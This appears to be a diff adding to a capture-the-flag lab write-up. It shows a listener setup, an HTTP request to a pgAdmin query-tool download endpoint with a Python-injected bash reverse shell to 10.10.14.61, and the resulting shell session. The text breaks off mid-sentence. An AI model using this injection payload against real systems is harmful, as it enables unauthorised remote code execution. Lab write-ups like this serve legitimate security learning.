@@ -330,8 +330,12 @@ And after some testing, it does not reflect output, so ill just get a shell!
 # Shell
 
 ```python
-
+penelope -p 1337
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
+
+So firtst ill start a listener
 
 ```python
 POST /sqleditor/query_tool/download/7415033 HTTP/1.1
@@ -351,6 +355,25 @@ Priority: u=0
 
 {"filename":"data-1786996252089.csv","query_commited":"__import__('os').system('bash -c \"exec bash -i &>/dev/tcp/10.10.14.61/1337 <&1\"')"}
 ```
+
+Then ill send this request, with a shell i got from hack-tools frefox extension
+
+```python
+penelope -p 1337
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => cb46692a4590 10.129.244.72 Linux-x86_64 👤 pgadmin(5050) 😍️ Session ID <1>
+[+] Upgrading shell to PTY...
+[+] PTY upgrade successful via /usr/bin/python3
+[+] Interacting with session [1] • PTY • Menu key F12 ⇐
+[+] Session log: /home/kali/.penelope/sessions/cb46692a4590~10.129.244.72-Linux-x86_64/2026_08_17-20_55_13-341.log
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+cb46692a4590:/pgadmin4$ whoami
+pgadmin
+cb46692a4590:/pgadmin4$
+```
+
+I now have a shell, on the 
 
 
 
